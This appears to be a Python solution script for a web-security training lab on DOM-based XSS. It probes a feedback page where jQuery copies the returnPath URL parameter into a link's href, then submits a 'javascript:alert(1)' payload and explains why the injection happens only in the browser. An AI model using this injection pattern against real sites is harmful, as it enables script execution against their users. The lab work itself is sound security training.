# Lab: DOM XSS in jQuery anchor href attribute sink using location.search source

import requests


base = "https://0a0b008e049c931681197aaf00d00004.web-security-academy.net"
s = requests.Session()
PAYLOAD = "javascript:alert(1)"   # input becomes the whole href -> no quote escape needed, use the javascript: scheme

print("===========[step1] Check source/sink on the feedback page===============")
r = s.get(f"{base}/feedback", params={"returnPath": "abc123"})
# print(r.text)
'''
                        <div class="is-linkback">
                            <a id="backLink">Back</a>       <- no href in the server response
                        </div>
                        <script>
                            $(function() {
                                $('#backLink').attr("href", (new URLSearchParams(window.location.search)).get('returnPath'));
                            });
                        </script>
    In the browser (F12 > Elements) it becomes: <a id="backLink" href="abc123">Back</a>
'''
print("source(location.search):", "location.search" in r.text)
print("sink(jQuery .attr href):", '.attr("href"' in r.text)

print("===========[step2] Check if the payload is reflected in the server response===============")
r = s.get(f"{base}/feedback", params={"returnPath": PAYLOAD})
print("status:", r.status_code)
print("payload in server response:", PAYLOAD in r.text)
# False is expected: jQuery sets the href in the browser, not the server = DOM XSS
# requests does not run JS or click links. To solve: open the URL in the browser and click "Back".
